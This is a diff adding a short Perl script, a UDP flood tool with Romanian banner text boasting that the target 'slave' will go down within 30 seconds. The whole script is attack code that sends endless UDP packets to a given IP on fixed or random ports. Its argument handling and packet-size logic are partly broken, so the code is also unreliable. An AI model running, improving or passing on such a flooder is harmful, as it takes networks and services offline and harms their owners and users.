@@ -1,0 +1,47 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$size,$time);
+if ($ARGC !=1) {
+printf "^[[0;31m* ^[[0;32m#> Hascer-ule comanda este perl thekodebreaker.txt ^[[0;31m$0 <IP> ^[[0;31m*^[[0m\n";
+exit(1);
+}
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "[0;32m###############################################################################\n";
+printf "[0;31m# Sclavul va fi picat in minim 30 de secunde #\n";
+printf "[0;32m###############################################################################\n";
+printf "[0;31m# Daca e smar3' are bombe pe fir  #\n";
+printf "[0;32m###############################################################################\n";
+printf "[0;31m# Trista Treaba . Apasa simultan [CLTR + C] pentru a scoate Sclav-ul din mormant #\n";
+printf "[0;32m###############################################################################\n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 8, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=int(rand 99500) +0;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
